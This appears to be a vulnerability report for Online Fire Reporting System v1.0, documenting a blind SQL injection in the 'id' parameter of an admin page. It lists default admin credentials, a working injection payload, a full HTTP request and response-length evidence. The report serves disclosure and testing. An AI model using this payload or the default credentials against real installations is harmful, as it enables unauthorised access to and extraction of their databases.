# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/admin/?page=requests/manage_request&id=

Vulnerability location: /ofrs/admin/?page=requests/manage_request&id=, id

Current database name: ofrs_db,length is 7

[+] Payload: /ofrs/admin/?page=requests/manage_request&id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /ofrs/admin/?page=requests/manage_request&id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 28978
![image](https://user-images.githubusercontent.com/54017627/170817519-0be3d582-24dd-40ee-a9eb-d97b5dc2819a.png)

![image](https://user-images.githubusercontent.com/54017627/170817539-7050bb76-608b-49a9-a7c3-c11c26685469.png)

When length (database ()) = 7, Content-Length: 29108
![image](https://user-images.githubusercontent.com/54017627/170817513-b3a5c989-69ee-453e-b699-2e7349edf3d7.png)

![image](https://user-images.githubusercontent.com/54017627/170817531-e4801fca-ebdf-4766-909f-a1e381503dcb.png)
